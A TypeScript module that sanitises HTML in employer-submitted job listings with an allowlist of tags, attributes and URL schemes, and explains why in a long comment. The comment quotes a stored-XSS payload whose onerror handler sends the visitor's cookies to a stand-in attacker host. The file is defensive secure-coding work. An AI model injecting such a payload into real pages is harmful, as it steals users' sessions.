import "server-only";
import sanitizeHtml from "sanitize-html";

/**
 * Sanitises job description / requirements / benefits before they are rendered
 * with dangerouslySetInnerHTML.
 *
 * WHY THIS IS NEEDED NOW
 * Job body copy is rendered as raw HTML in components/job-detail.tsx. That was
 * defensible while only PAC staff wrote listings. Employers can now self-serve,
 * which turns it into stored XSS: an employer submits a description containing
 * `<img src=x onerror="fetch('https://attacker/'+document.cookie)">`, an admin
 * approves the listing without reading the markup, and the payload then runs for
 * every visitor to a public page — including admins and employers browsing while
 * signed in. Supabase keeps its session in a cookie readable by JS, so that is a
 * session-theft path, not just defacement.
 *
 * Sanitising on READ rather than on write, deliberately: it also covers the
 * 4,355 descriptions already migrated out of WordPress, and anything inserted
 * directly through PostgREST with the public anon key, neither of which passes
 * through the write path.
 *
 * ALLOWLIST, not a blocklist. Job copy needs paragraphs, lists, emphasis,
 * headings and links — nothing more. No script, no style, no iframe, no event
 * handlers, and no attributes beyond href on a link.
 */
const OPTIONS: sanitizeHtml.IOptions = {
  allowedTags: [
    "p", "br", "hr",
    "strong", "b", "em", "i", "u", "s",
    "ul", "ol", "li",
    "h2", "h3", "h4",
    "blockquote",
    "a",
    "table", "thead", "tbody", "tr", "th", "td",
  ],
  allowedAttributes: {
    a: ["href", "title"],
  },
  // http/https/mailto/tel only — blocks javascript: and data: URLs.
  allowedSchemes: ["http", "https", "mailto", "tel"],
  allowedSchemesAppliedToAttributes: ["href"],
  // Untrusted links leave the site, so do not hand over window.opener.
  transformTags: {
    a: (tagName, attribs) => ({
      tagName,
      attribs: { ...attribs, rel: "nofollow noopener noreferrer", target: "_blank" },
    }),
  },
  // Drop the contents of anything removed, rather than leaving inline JS as text.
  nonTextTags: ["style", "script", "textarea", "option", "noscript", "iframe"],
};

export function sanitizeJobHtml(html: string | null | undefined): string {
  if (!html) return "";
  return sanitizeHtml(html, OPTIONS);
}
